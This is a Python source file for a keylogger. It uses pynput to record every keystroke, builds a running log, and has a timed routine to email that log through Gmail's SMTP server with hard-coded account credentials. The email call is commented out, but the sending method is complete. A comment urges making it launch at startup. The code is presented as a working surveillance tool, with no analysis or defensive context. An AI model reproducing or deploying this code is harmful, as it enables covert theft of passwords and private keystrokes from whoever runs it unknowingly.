#!/usr/bin/env python

# There are local and remote keyloggers, remember to try get it to start on statup.
# pip install pynput

import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, timer_interval, email, password):
        self.log = "Keylogger started"
        self.interval = timer_interval
        self.email = email
        self.password = password
        print("Constructing Keylogger Object")


    # method will be called on self
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)


    # Need another thread to run to send email report.
    def report(self):
        print(self.log)
        #self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval,self.report)
        timer.start()

    
    def start(self):
        #callback function executed in the Listener()
        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listner:
            self.report()
            keyboard_listner.join()


    def append_to_log(self, string):
        self.log = self.log + string


    def send_mail(self, email, password, message):
        # Create an instace of an SMTP server, google allows you to use theirs
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        # Params (From, To, Message)
        server.sendmail(email, email, message)
        server.quit()
